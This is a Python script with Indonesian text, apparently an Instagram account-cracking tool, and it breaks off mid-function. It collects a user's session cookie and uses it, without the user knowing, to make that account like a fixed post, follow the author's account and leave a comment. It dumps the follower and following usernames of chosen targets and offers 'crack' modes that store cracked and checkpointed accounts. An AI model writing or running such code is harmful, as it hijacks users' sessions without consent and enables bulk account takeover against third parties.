import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

# Warna
H = (\'\\x1b[1;90m\')
M = (\'\\x1b[1;91m\')
H = (\'\\x1b[1;92m\')
K = (\'\\x1b[1;93m\')
T = (\'\\x1b[1;94m\')
U = (\'\\x1b[1;95m\')
B = (\'\\x1b[1;96m\')
P = (\'\\x1b[1;97m\')

# Logo
___logo___ = (f"""{H} 
{H}\xe2\x96\x90\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x8c
{B}\xe2\x96\x90\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x84\xe2\x96\x8c
{B}\xe2\x96\x90\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x8c
""")

#log in


#loading animasi
import sys,time
def run(teks):
    putih = "\\033[0m"
    merah = "\\033[91m"
    teks = teks+" "
    try:
        num = 0
        while num < 1:
            for i,char in enumerate(teks):
                if i == 0:
                    sys.stdout.write(\'\\r%s%s%s%s\' % (putih,char.lower(),merah,teks[1:])),
                    sys.stdout.flush()
                else:
                    if i == 1:
                        zbl = teks[0].lower()
                        sys.stdout.write(\'\\r%s%s%s%s%s%s\' % (merah,zbl,putih,char.lower(),putih,teks[2:])),
                        sys.stdout.flush()
                    else:
                        if i == i:
                            zbl = teks[0:i].lower()
                            sys.stdout.write(\'\\r%s%s%s%s%s%s\' % (merah,zbl,putih,char.lower(),putih,teks[i+1:])),
                            sys.stdout.flush()
                    time.sleep(0.4)
            num += 1
    except: exit()

run("LOADING BG")


# Login Cookie
def ___login___():
    os.system(\'clear\')
    print(___logo___)
    print(f"{B}[{P}\xe2\x80\xa2{B}]{H} \xe1\xb4\x8d\xe1\xb4\x80s\xe1\xb4\x9c\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b\xc9\xaas \xc9\xaa\xc9\xb4s\xe1\xb4\x9b\xe1\xb4\x80\xc9\xa2\xca\x80\xe1\xb4\x80\xe1\xb4\x8d, \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xc9\xa2\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x9c\xc9\xb4 \xca\x8f\xc9\xa2 \xca\x99\xe1\xb4\x80\xca\x80\xe1\xb4\x9c \xe1\xb4\x85\xc9\xaa \xca\x99\xe1\xb4\x9c\xe1\xb4\x80\xe1\xb4\x9b, \xe1\xb4\x9b\xe1\xb4\x9c\xe1\xb4\x9b\xe1\xb4\x8f\xca\x80 \xe1\xb4\x85\xe1\xb4\x80\xe1\xb4\xa9\xe1\xb4\x80\xe1\xb4\x9b \xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b\xc9\xaas \xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x9b\xc9\xaa\xe1\xb4\x8b  {M}[{P}O\xe1\xb4\xa9\xe1\xb4\x87\xc9\xb4{M}]{P}\
")
    ___cookie = input(f"{H}[{P}?{H}]{U} C\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b\xc9\xaa\xe1\xb4\x87 :{K} ")
    if ___cookie in [\'open\', \'Open\', \'OPEN\']:
        print(f"{K}[{P}!{K}]{K} \xe1\xb4\x80\xc9\xb4\xe1\xb4\x85\xe1\xb4\x80 \xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x85\xc9\xaa \xe1\xb4\x80\xca\x80\xe1\xb4\x80\xca\x9c\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x87 \xe1\xb4\xa1\xca\x9c\xe1\xb4\x80\xe1\xb4\x9bs\xe1\xb4\x80\xe1\xb4\x80\xe1\xb4\xa9..\xc9\xaa\xe1\xb4\x8b\xe1\xb4\x9c\xe1\xb4\x9b\xc9\xaa\xc9\xb4 \xe1\xb4\x84\xe1\xb4\x80\xca\x80\xe1\xb4\x80 \xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b\xe1\xb4\x9c\xe1\xb4\x8b \xe1\xb4\x8d\xe1\xb4\x87\xc9\xb4\xe1\xb4\x85\xe1\xb4\x80\xe1\xb4\xa9\xe1\xb4\x80\xe1\xb4\x9b\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b\xc9\xaa\xe1\xb4\x87....");sleep(3);os.system(\'xdg-open https://api.whatsapp.com/send/?phone=6289690719275&text&app_absent=0\');exit()
    elif ___cookie in [\'\', \' \']:
        exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x8fs\xe1\xb4\x8f\xc9\xb4\xc9\xa2 \xca\x99\xc9\xa2")
    else:
        try:
            ___userid = re.search(\'ds_user_id=(.*?);\', ___cookie);open(\'Data/user.txt\', \'w\').write(___userid.group(1))
            ___pin = requests.get(f\'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': ___cookie}).json()[\'user\'];open(\'Data/coki.txt\', \'w\').write(___cookie)
            print(f"{H}[{P}*{H}]{P} Welcome :{K} {___pin[\'full_name\']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{P}[{M}!{P}]{M} Pastikan Cookie Sudah Benar")
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{U} K\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xe1\xb4\x8bs\xc9\xaa \xe1\xb4\x8d\xe1\xb4\x9c \xe1\xb4\x87\xca\x80\xe1\xb4\x8f\xca\x80")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open(\'Data/coki.txt\', \'r\').read()
        ___session = re.search(\'sessionid=(.*?);\', ___cookie)
        ___teks = random.choice([\'Hallo Bang \xf0\x9f\x98\x8d\',\'Hai Bang Apa Kabar \xf0\x9f\x98\x8e\',\'Izin Pake Scriptnya \xf0\x9f\x98\x81\',\'Mantap Bang \xf0\x9f\x98\x98\',\'Programmer Bang \xf0\x9f\xa4\x94\',\'Salam Kenal Bang \xf0\x9f\xa4\x97\',\'I Love You \xe2\x9d\xa4\xef\xb8\x8f\'])
        ___data = {\'comment_text\': ___teks,\'replied_to_comment_id\':\'\'}
        with requests.Session() as ses:
            ___like = ses.post(\'https://www.instagram.com/web/likes/2734317205115382629/like/\',headers = {\'accept\': \'*/*\',\'accept-encoding\': \'gzip, deflate, br\',\'accept-language\': \'en-US,en;q=0.9\',\'content-length\': \'0\',\'content-type\': \'application/x-www-form-urlencoded\',\'cookie\': \'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=\'+___session.group(1),\'origin\': \'https://www.instagram.com\',\'referer\': \'https://www.instagram.com/\',\'sec-fetch-dest\': \'empty\',\'sec-fetch-mode\': \'cors\',\'sec-fetch-site\': \'same-origin\',\'user-agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\',\'x-csrftoken\': \'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r\',\'x-ig-app-id\': \'5398218083\',\'x-ig-www-claim\': \'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu\',\'x-instagram-ajax\': \'95bfef5dd816\',\'x-requested-with\': \'XMLHttpRequest\'}).text # Jangan Di Ubah!
            ___follow = ses.post(\'https://www.instagram.com/web/friendships/5398218083/follow/\',headers = {\'accept\': \'*/*\',\'accept-encoding\': \'gzip, deflate, br\',\'accept-language\': \'en-US,en;q=0.9\',\'content-length\': \'0\',\'content-type\': \'application/x-www-form-urlencoded\',\'cookie\': \'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=\'+___session.group(1),\'origin\': \'https://www.instagram.com\',\'referer\': \'https://www.instagram.com/\',\'sec-fetch-dest\': \'empty\',\'sec-fetch-mode\': \'cors\',\'sec-fetch-site\': \'same-origin\',\'user-agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\',\'x-csrftoken\': \'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r\',\'x-ig-app-id\': \'5398218083\',\'x-ig-www-claim\': \'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu\',\'x-instagram-ajax\': \'95bfef5dd816\',\'x-requested-with\': \'XMLHttpRequest\'}).text # Jangan Di Ubah!
            ___komen = ses.post(\'https://www.instagram.com/web/comments/2734317205115382629/add/\',headers = {\'accept\': \'*/*\',\'accept-encoding\': \'gzip, deflate, br\',\'accept-language\': \'en-US,en;q=0.9\',\'content-length\': \'0\',\'content-type\': \'application/x-www-form-urlencoded\',\'cookie\': \'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=\'+___session.group(1),\'origin\': \'https://www.instagram.com\',\'referer\': \'https://www.instagram.com/\',\'sec-fetch-dest\': \'empty\',\'sec-fetch-mode\': \'cors\',\'sec-fetch-site\': \'same-origin\',\'user-agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\',\'x-csrftoken\': \'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r\',\'x-ig-app-id\': \'5398218083\',\'x-ig-www-claim\': \'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu\',\'x-instagram-ajax\': \'95bfef5dd816\',\'x-requested-with\': \'XMLHttpRequest\'}, data = ___data).text #Jangan Di ubah!
            if \'"status":"ok"\' in str(___follow):
                print(f"{H}[{P}!{H}]{K} \xca\x9f\xe1\xb4\x8f\xc9\xa2\xc9\xaa\xc9\xb4 \xca\x99\xe1\xb4\x87\xca\x80\xca\x9c\xe1\xb4\x80s\xc9\xaa\xca\x9f");___menu___()
            else:
                print(f"{P}[{M}!{P}]{M} Cookie s\xe1\xb4\x80\xca\x9f\xe1\xb4\x80\xca\x9c \xca\x99\xca\x9f\xe1\xb4\x8f\xe1\xb4\x8b");sleep(3);os.system(\'rm -rf Data/coki.txt\');___login___()
    except Exception as e:
        print(f"{P}[{M}!{P}]{M} Cookie s\xe1\xb4\x80\xca\x9f\xe1\xb4\x80\xca\x9c \xca\x99\xca\x9f\xe1\xb4\x8f\xe1\xb4\x8b");sleep(3);os.system(\'rm -rf Data/coki.txt\');___login___()
# Menu
def ___menu___():
    try:
        os.system(\'clear\')
        print(___logo___)
        ___pin = requests.get(f\'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'user\']
        print(f"{B}{H}\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97")        
        print(f"{H}\xe2\x95\xa0\xe2\x95\x90{P}\xe2\x96\xb6{B}{U} Welcome :{K} {___pin[\'full_name\']}.                   {H}\xe2\x95\x91")
        print(f"{H}\xe2\x95\xa0\xe2\x95\x90{P}\xe2\x96\xb6{B}{U} User :{K} {___pin[\'username\']}.              {H}\xe2\x95\x91")
        print(f"{H}\xe2\x95\xa0\xe2\x95\x90{P}\xe2\x96\xb6{B}{U} Follower :{K} {___pin[\'follower_count\']}.                 {H}\xe2\x95\x91")
        print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\
") 
    except (IOError):
        print(f"{P}[{M}!{P}]{M} \xca\x99\xca\x9f\xe1\xb4\x8f\xe1\xb4\x8d \xe1\xb4\x8d\xe1\xb4\x80s\xe1\xb4\x9c\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b\xc9\xaa\xe1\xb4\x87");sleep(3);___login___()
    except (KeyError):
        print(f"{P}[{M}!{P}]{M} Cookie s\xe1\xb4\x80\xca\x9f\xe1\xb4\x80\xca\x9c \xca\x99\xca\x9f\xe1\xb4\x8f\xe1\xb4\x8b");os.system(\'rm -rf Data/coki.txt && rm -rf Data/user.txt\');sleep(3);___login___()
    except (IOError):
        exit(f"{P}[{K}!{P}]{M} K\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xe1\xb4\x8bs\xc9\xaa \xe1\xb4\x8d\xe1\xb4\x9c \xe1\xb4\x87\xca\x80\xe1\xb4\x8f\xca\x80")
    print(f"{B}{H}\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb61{B}]{B} D\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87 \xe1\xb4\x85\xe1\xb4\x80\xca\x80\xc9\xaa \xe1\xb4\x8d\xe1\xb4\x87\xc9\xb4\xc9\xa2\xc9\xaa\xe1\xb4\x8b\xe1\xb4\x9c\xe1\xb4\x9b\xc9\xaa.{P}{H} \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb62{B}]{B} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87 \xe1\xb4\x85\xe1\xb4\x80\xca\x80\xc9\xaa \xe1\xb4\xa9\xe1\xb4\x87\xc9\xb4\xc9\xa2\xc9\xaa\xe1\xb4\x8b\xe1\xb4\x9c\xe1\xb4\x9b.{P}{H}  \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb63{B}]{B} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87 \xe1\xb4\x85\xe1\xb4\x80\xca\x80\xc9\xaa \xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x9b\xc9\xaa\xe1\xb4\xa0\xc9\xaa\xe1\xb4\x9b\xca\x8f. {P}{H} \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb64{B}]{B} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87 \xe1\xb4\x85\xe1\xb4\x80\xca\x80\xc9\xaa \xca\x99\xe1\xb4\x87\xca\x80\xe1\xb4\x80\xc9\xb4\xe1\xb4\x85\xe1\xb4\x80.  {P}{H} \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb65{B}]{B} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87 \xe1\xb4\x85\xe1\xb4\x80\xca\x80\xc9\xaa \xca\x9c\xe1\xb4\x80s\xe1\xb4\x9b\xe1\xb4\x80\xc9\xa2.   {P}{H} \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb69{B}]{B} \xe1\xb4\x8d\xe1\xb4\x9c\xca\x9f\xe1\xb4\x80\xc9\xaa \xe1\xb4\x84\xca\x80\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x8b {P}[{H}\xd2\x92\xe1\xb4\x80s\xe1\xb4\x9b{P}]{H}            \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb60{B}]{B} \xca\x9c\xe1\xb4\x80s\xc9\xaa\xca\x9f \xe1\xb4\x84\xca\x80\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x8b \xca\x9f\xc9\xaa\xca\x9c\xe1\xb4\x80\xe1\xb4\x9b.          {P}{H}  \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x96\xb6A{B}]{B} \xe1\xb4\x8b\xe1\xb4\x87\xca\x9f\xe1\xb4\x9c\xe1\xb4\x80\xca\x80 {P}[{M}\xe1\xb4\x87x\xc9\xaa\xe1\xb4\x9b{P}]{M}.  {P}{H}              \xe2\x95\x91")
    print(f"{B}{H}\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\
") 
    
    ___pilih = input(f"{H}[{P}?{H}]{U} \xe1\xb4\xa9\xc9\xaa\xca\x9f\xc9\xaa\xca\x9c :{K} ")
    if ___pilih in [\'1\',\'01\']:    \t          
        ___mengikuti___()
    elif ___pilih in [\'2\',\'02\']:
        ___pengikut___()
    elif ___pilih in [\'3\',\'03\']:
        ___activity___()
    elif ___pilih in [\'4\',\'04\']:
        ___beranda___()
    elif ___pilih in [\'5\',\'05\']:
        ___hastag___()
    elif ___pilih in [\'6\',\'06\']:
        ___search___()
    elif ___pilih in [\'7\',\'07\']:
        ___query___()
    elif ___pilih in [\'8\',\'08\']:
        ___email___()
    elif ___pilih in [\'9\',\'09\']:
        ___proxy___()
    elif ___pilih in [\'0\',\'00\']:
        try:       \t               
            print(f"\
{H}[{P}1{H}]{H} \xca\x9f\xc9\xaa\xca\x9c\xe1\xb4\x80\xe1\xb4\x9b \xca\x9c\xe1\xb4\x80s\xc9\xaa\xca\x9f \xe1\xb4\x8f\xe1\xb4\x8b")
            print(f"{H}[{P}2{H}]{H} \xca\x9f\xc9\xaa\xca\x9c\xe1\xb4\x80\xe1\xb4\x9b \xca\x9c\xe1\xb4\x80s\xc9\xaa\xca\x9f \xe1\xb4\x84\xe1\xb4\xa9")
            print(f"{H}[{P}3{H}]{H} \xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x8d\xca\x99\xe1\xb4\x80\xca\x9f\xc9\xaa\
")
            ___hasil = input(f"{B}[{P}?{B}]{B} \xe1\xb4\xa9\xc9\xaa\xca\x9f\xc9\xaa\xca\x9c :{K} ")
            if ___hasil in [\'1\',\'01\']:            \t                      
                print(f"{K} ");os.system(\'cat Results/Ok.txt\')
            elif ___hasil in [\'2\',\'02\']:
                print(f"{K} ");os.system(\'cat Results/Cp.txt\')
            elif ___hasil in [\'3\',\'03\']:
                ___menu___()
            else:
                exit(f"{P}[{M}!{P}]{M} menghapus cooki")
        except:pass
    elif ___pilih in [\'a\',\'A\']:
        print(f"{P}[{K}!{P}]{K} \xe1\xb4\xa9\xca\x80\xe1\xb4\x8fs\xe1\xb4\x87s \xca\x9c\xe1\xb4\x80\xe1\xb4\xa9\xe1\xb4\x9cs \xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b\xc9\xaa\xe1\xb4\x87...");os.system(\'rm -rf Data/coki.txt && rm -rf Data/user.txt\');exit()
    else:
        exit(f"{P}[{K}!{P}]{M} \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x8fs\xe1\xb4\x8f\xc9\xb4\xc9\xa2")
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"\
{H}[{P}?{H}]{P} User :{K} ")
        if ___user[:1] in [\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'0\']:
            exit(f"{P}[{M}!{P}]{M} \xc9\xa2\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87")
        else:
            ___pin = requests.get(f\'https://www.instagram.com/{___user}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']
            print(f"{H}[{P}?{H}]{P} Name :{K} {___pin[\'full_name\']}\
")
            ___file = (___pin[\'full_name\'].replace(\' \',\'_\')+\'.txt\')
        with requests.Session() as ses:
            ___pin = ses.get(f\'https://i.instagram.com/api/v1/friendships/{___pin["id"]}/following/?count=5000\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()
            for z in ___pin[\'users\']:
                open(\'Dump/\'+___file, \'a\').write(z[\'username\']+\'<=>\'+z[\'full_name\']+\'\
\')
                print(f"{U}{z[\'username\']}<=>{z[\'full_name\']}")
            print(f"\
{B}[{P}*{B}]{U} s\xe1\xb4\x87\xca\x9f\xe1\xb4\x87s\xe1\xb4\x80\xc9\xaa...")
            print(f"{B}[{P}?{B}]{U} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xe1\xb4\x9b\xe1\xb4\x87\xca\x80s\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x85\xc9\xaa :{K} Dump/{___file}")
            input(f"{M}[{U}\xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x8d\xca\x99\xe1\xb4\x80\xca\x9f\xc9\xaa{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xc9\xb4\xca\x8f\xe1\xb4\x80 \xc9\xa2\xe1\xb4\x80\xc9\xa2\xe1\xb4\x80\xca\x9f")
    except (ConnectionError):
        exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8b\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xe1\xb4\x8bs\xc9\xaa \xe1\xb4\x8d\xe1\xb4\x9c \xe1\xb4\x87\xca\x80\xe1\xb4\x8f\xca\x80")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\
{H}[{P}?{H}]{P} User :{K} ")
        if ___user[:1] in [\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'0\']:
            exit(f"{P}[{M}!{P}]{M} \xc9\xa2\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x9cs\xe1\xb4\x87\xca\x80\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x87")
        else:
            ___pin = requests.get(f\'https://www.instagram.com/{___user}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']
